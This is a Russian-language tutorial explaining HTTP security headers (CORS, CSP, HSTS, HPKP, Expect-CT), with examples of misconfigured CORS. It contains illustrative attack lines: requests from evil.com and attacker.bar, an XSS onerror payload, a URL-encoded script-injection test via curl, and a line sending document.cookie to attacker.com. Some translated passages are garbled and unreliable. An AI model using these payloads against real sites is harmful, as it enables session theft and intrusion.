**Совместное использование ресурсов (CORS)**

**CORS(Cross-Origin Resource Sharing)** — это механизм безопасности, который позволяет веб-странице из одного домена обращаться к ресурсу с другим доменом (кросс-доменным запросом). Без таких функций, как CORS, веб-сайты ограничиваются доступом к ресурсам одного и того же происхождения через так называемую политику единого происхождения.

По умолчанию веб-браузеры не разрешают AJAX-запросы на сайты, кроме сайта, который вы посещаете. Это называется политикой единого происхождения, и это важная часть модели веб-безопасности. Совместное использование ресурсов между разными источниками (cross-origin resource sharing) — это механизм HTML 5, который дополняет политику единого происхождения для упрощения совместного использования ресурсов домена между различными веб-приложениями.

Спецификация CORS определяет набор заголовков, которые позволяют серверу и браузеру определять, какие запросы для междоменных ресурсов (изображения, таблицы стилей, сценарии, данные и т. д.) разрешены, а какие нет. CORS является техникой для ослабления правила одного источника, позволяя JavaScript на web странице обрабатывать REST API запросы от другого источника.

При запросе на site.ru/resource с site.com/some будут следующие заголовки:

GET /resource
Host:site.ru
Origin: http://site.com


Если запрос принят, запрашиваемый сервер добавляет к ответу заголовок Access-Control-Allow-Origin, содержащий домен запроса site.com.

**Access-Control-Allow-Origin** указывает, какие домены могут обращаться к ресурсам сайта. Например, если компания имеет домены site.ru и site.com, то ее разработчики могут использовать этот заголовок, чтобы предоставить site.com доступ к ресурсам site.ru.

**Access-Control-Allow-Methods** определяет, какие HTTP-запросы (GET, PUT, DELETE и т. д.) могут быть использованы для доступа к ресурсам. Этот заголовок позволяет повысить безопасность, указав какие методы действительны, когда site.com обращается к ресурсам site.ru.

**Access-Control-Max-Age** указывает время жизни предзапроса (также он называется "предполетным") доступности того или иного метода, после которого должен быть выполнен новый запрос на тот или иной метод.

Наиболее распространенная проблема безопасности при внедрении CORS — это отказ от проверки запроса белых списков. Зачастую разработчики устанавливают значение для Access-Control-Allow-Origin в '*'. Это позволяет любому домену в Интернете получать доступ к ресурсам этого сайта.

Пример ошибки:
No 'Access-Control-Allow-Origin' header is present on the requested resource. Origin 'null' is therefore not allowed access.

Сценарий должен выполняться на стороне клиента, чтобы получить доступ к вашим куки-сайтам на стороне клиента.

Запрос:

GET /resource  HTTP/1.1
Host: site.ru
Referer: http://evil.com/request.html
Origin: http://evil.com

Ответ:

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *

Основания проблема кроется в том, что многие компании размещают API в пределах домена, не ограничивания к нему доступ политикой "белого списка". Это порождает уязвимость.

**Attack scenario**

Большинство веб-приложений использует файлы cookie для отслеживания информации о сеансе. При генерации cookie ограничены определенным доменом. При каждом HTTP запросе к этому домену браузер подставлять значение cookie, созданные для этого домена. Это относится к каждому HTTP запросу — для получения изображений, страниц или AJAX-вызовов.

Что это означает на практике: при авторизации в goodsite.ru, cookie генерируются и хранятся для этого домена. Веб-приложение goodsite.ru основано на технологии SPA и содержит REST API на goodsite.ru/api для взаимодействия с помощью AJAX. Предположим, что вы просматриваете badsite.ru, будучи авторизованным на goodsite.ru. Без ограничения Access-Control-Allow-Origin по белому списку (с указанием сайта) badsite.ru может выполнить любой разрешенный аутентифицированный запрос к goodsite.ru, даже не имея прямого доступа к сессионной cookie!

Это связано с тем, что браузер автоматически привязывает файлы cookie к goodsite.ru для любых HTTP запросов в этом домене, включая AJAX запросы от badsite.ru в goodsite.ru. Таким образом атакующий может взаимодействовать даже с вашим внутренним ресурсом, недоступным в сети интернет и находящимся в корпоративной сети.

Access-Control-Allow-Credentials Вы правы — для запросов с withCredentials предусмотрено дополнительное подтверждение со стороны сервера. При запросе с withCredentials сервер должен вернуть уже не один, а два заголовка:

Access-Control-Allow-Origin: домен
Access-Control-Allow-Credentials: true

Значение заголовка «Access-Control-Allow-Origin» не должно равняться *. Иначе, даже если Access-Control-Allow-Credentials === true, то браузер не допустит отправку сredentials.

---

Например, такой запрос будет показывать содержимое файла profile.php:
http://example.foo/main.php#profile.php

Запрос:

GET http://example.foo/profile.php HTTP/1.1
Host: example.foo
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: http://example.foo/main.php

Ответ:

HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Type: text/html

[Response Body]

Т.к. отсутствует проверка URL-адреса, атакующий может добавить скрипт, который будет выполняться в контексте домена example.foo со следующим URL:

http://example.foo/main.php#http://attacker.bar/file.php

Запрос:

GET http://attacker.bar/file.php HTTP/1.1
Host: attacker.bar
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: http://example.foo/main.php
Origin: http://example.foo

Ответ:

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Content-Type: text/html

Пейлоад attacker.bar <img src="#" onerror="alert('Domain: '+document.domain)"> 

---

**Политика безопасности контента (CSP)**

**Content Security Policy (CSP)**

Итак, как это работает? 

Когда вы нажимаете на ссылку или набираете URL-адрес веб-сайта в адресной строке вашего браузера, ваш браузер делает запрос GET. Он в конечном итоге пробивается к серверу, который обслуживает HTML вместе с некоторыми HTTP-заголовками. Если вам интересно, какие заголовки вы получаете, откройте вкладку «Сеть» в консоли и посетите некоторые веб-сайты.

content-security-policy: default-src * data: blob:;script-src *.facebook.com *.fbcdn.net *.facebook.net *.google-analytics.com *.virtualearth.net *.google.com 127.0.0.1:* *.spotilocal.com:* 'unsafe-inline' 'unsafe-eval' *.atlassolutions.com blob: data: 'self';style-src data: blob: 'unsafe-inline' *;connect-src *.facebook.com facebook.com *.fbcdn.net *.facebook.net *.spotilocal.com:* wss://*.facebook.com:* https://fb.scanandcleanlocal.com:* *.atlassolutions.com attachment.fbsbx.com ws://localhost:* blob: *.cdninstagram.com 'self' chrome-extension://boadgeojelhgndaghljhdicfkmllpafd chrome-extension://dliochdbjfkdbacpmhlcpmleaejidimm;

Это политика безопасности контента на facebook.com. Давайте переформатируем его, чтобы было легче читать:

content-security-policy:

default-src * data: blob:;

script-src *.facebook.com *.fbcdn.net *.facebook.net *.google-analytics.com *.virtualearth.net *.google.com 127.0.0.1:* *.spotilocal.com:* 'unsafe-inline' 'unsafe-eval' *.atlassolutions.com blob: data: 'self';

style-src data: blob: 'unsafe-inline' *;

connect-src *.facebook.com facebook.com *.fbcdn.net *.facebook.net *.spotilocal.com:* wss://*.facebook.com:* https://fb.scanandcleanlocal.com:* *.atlassolutions.com attachment.fbsbx.com ws://localhost:* blob: *.cdninstagram.com 'self' chrome-extension://boadgeojelhgndaghljhdicfkmllpafd chrome-extension://dliochdbjfkdbacpmhlcpmleaejidimm;

**default-src** ограничивает все другие директивы CSP, которые явно не указаны. (Внутри «default-src» скрывается «script-src».)

**script-src** ограничивает скрипты, которые могут быть загружены. 

**style-src** ограничивает таблицы стилей, которые могут быть загружены. 

**connect-src** ограничивает URL-адреса, которые могут быть загружены с использованием интерфейсов сценариев, поэтому fetch, XHR, ajax и т. д. 

Существует гораздо больше директив CSP, чем только эти четыре, показанные выше. Браузер прочитает заголовок CSP и применит эти директивы ко всему в HTML-файле, который был подан. Если директивы установлены надлежащим образом, они допускают только то, что необходимо. 

Если нет заголовка CSP, тогда все идет, и ничто не ограничено. Везде, где вы видите *, это шаблон. Вы можете представить себе замену * на что угодно, и это будет разрешено.

Пример:

URL с включенным CSP
?search=%3Cscript+type%3D%22text%2Fjavascript%22%3Ealert%28%27You%20have%20been%20PWNED%27%29%3C%2Fscript%3E&csp=on

curl -I "http://localhost:7888/?search=%3Cscript+type%3D%22text%2Fjavascript%22%3Ealert%28%27You%20have%20been%20PWNED%27%29%3C%2Fscript%3E&csp=on"
HTTP/1.1 200 OK
X-XSS-Protection: 0
Content-Security-Policy: default-src 'self'
Date: Sat, 11 Aug 2018 10:46:27 GMT
Connection: keep-alive

С перенаправлением на сайт
  window.location = `attacker.com/${document.cookie}`

Только для отчетов заголовок
  Content-Security-Policy: default-src 'self'; report-uri http://cspviolations.example.com/collector

**Политики CSP** могут быть немного сложными сами по себе, например, в следующем примере:

Content-Security-Policy: default-src 'self'; script-src scripts.example.com; img-src *; media-src medias.example.com medias.legacy.example.com

Эта политика определяет следующие правила: 

  исполняемые скрипты (например, JavaScript) можно загружать только из scripts.example.com. 

  Изображения могут быть загружены из любого источника (img-src: *)

  видео или аудиоконтент может быть загружен из двух происхождений: medias.example.com и medias.legacy.example.com
  
  

**HTTP Strict-Transport-Security (HSTS)**

Заголовок Facebook: 

strict-transport-security: max-age = 15552000; preload 
max-age указывает, как долго браузер должен забыть заставить пользователя получить доступ к веб-сайту с помощью HTTPS.(max-age = 3600 сообщит браузеру, что в течение следующего часа (3600 секунд) он не должен взаимодействовать с приложением с небезопасными протоколами)
preload не имеет значения для наших целей. Это сервис, размещенный Google, а не часть спецификации HSTS. 
Этот заголовок применяется только при доступе к сайту с использованием HTTPS. Если вы получили доступ к сайту через HTTP, заголовок игнорируется. Причина в том, что, просто, HTTP настолько небезопасен, что ему нельзя доверять. 

Давайте используем пример Facebook, чтобы еще раз пояснить, насколько это полезно на практике. Вы впервые получаете доступ к facebook.com, и знаете, что HTTPS безопаснее, чем HTTP, поэтому вы обращаетесь к нему через HTTPS, https://facebook.com. Когда ваш браузер получает HTML-код, он получает заголовок, который указывает вашему браузеру принудительно перенаправить вас на HTTPS для будущих запросов. Через месяц кто-то отправит вам ссылку на Facebook с помощью HTTP, http://facebook.com, и вы нажмете на нее. Поскольку один месяц меньше, чем 15552000 секунд, указанный в директиве max-age, ваш браузер отправит запрос в виде HTTPS, предотвращая потенциальную атаку MITM.

**HTTP Public Key Pinning (HPKP)**

HTTP Public Key Pinning - это механизм, который позволяет нам рекламировать браузер, какие SSL-сертификаты следует ожидать всякий раз, когда он подключается к нашим серверам. Это доверие к первому заголовку, как HSTS, что означает, что, как только клиент подключится к нашему серверу, он сохранит информацию сертификата для последующих взаимодействий. Если в любой момент времени клиент обнаруживает, что сервер использует другой сертификат, он будет вежливо отказываться от подключения, очень сильно удаляя людей в середине (MITM). 

Вот как выглядит политика HPKP:

Public-Key-Pins:
  pin-sha256="9yw7rfw9f4hu9eho4fhh4uifh4ifhiu=";
  pin-sha256="cwi87y89f4fh4fihi9fhi4hvhuh3du3=";
  max-age=3600; includeSubDomains;
  report-uri="https://pkpviolations.example.org/collect"
  
**Expect-CT**

В то время как **HPKP** устарел, появился новый заголовок, чтобы предотвратить использование мошеннических SSL-сертификатов клиентам: Expect-CT. 

Цель этого заголовка - сообщить браузеру, что он должен выполнять дополнительные «проверки фона», чтобы гарантировать подлинность сертификата: когда сервер использует заголовок Expect-CT, он в основном просит клиента проверить, что сертификаты являются используются в открытых журналах Transparency (CT). 

Expect-CT: max-age=3600, enforce, report-uri="https://ct.example.com/report"


max-age - включить проверку CT для текущего приложения в течение 1 часа (3600 секунд)

enforce - применить эту политику и предотвратить доступ к приложению, если произошло нарушение 

report-uri - отправить отчет на данный URL-адрес, если происходит нарушение 

Цель инициативы прозрачности сертификата заключается в обнаружении неправильно выданных или вредоносных сертификатов (и мошеннических центров сертификации) раньше, быстрее и точнее, чем любой другой метод, использованный ранее. 
